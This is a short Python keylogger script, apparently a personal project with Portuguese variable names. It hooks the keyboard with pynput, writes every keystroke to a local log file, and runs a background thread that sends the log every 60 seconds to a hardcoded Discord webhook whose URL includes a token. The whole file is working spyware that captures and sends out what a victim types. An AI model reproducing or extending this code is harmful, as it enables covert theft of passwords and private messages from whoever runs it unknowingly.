import pynput
import threading
import enviarLog as enviar

webhook_URL = "https://discord.com/api/webhooks/1440389519353319504/PQr2nuK1QRvsQLsA3vBOs1mF4JgGDIqkYym5QpSBLJUOZCNBZdpASx9nP0Ynu3Nwktop"
caminho_log = "C:/Users/Bruno/Desktop/projetos/pythonKeylogger/log.txt"
nome = "Pele Jhonson"
segundos = 60

webhook_thread = threading.Thread(
    target=enviar.loop_do_envio,
    args=(caminho_log, webhook_URL, nome, segundos)
)

webhook_thread.daemon = True

webhook_thread.start()
print("Thread ativo")

with open(caminho_log, 'w') as log:
    log.write('')
    print("criou o txt")

def on_press(key):
    with open(caminho_log, 'a') as log: 
        log.write(f'{key}\n')

with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()

 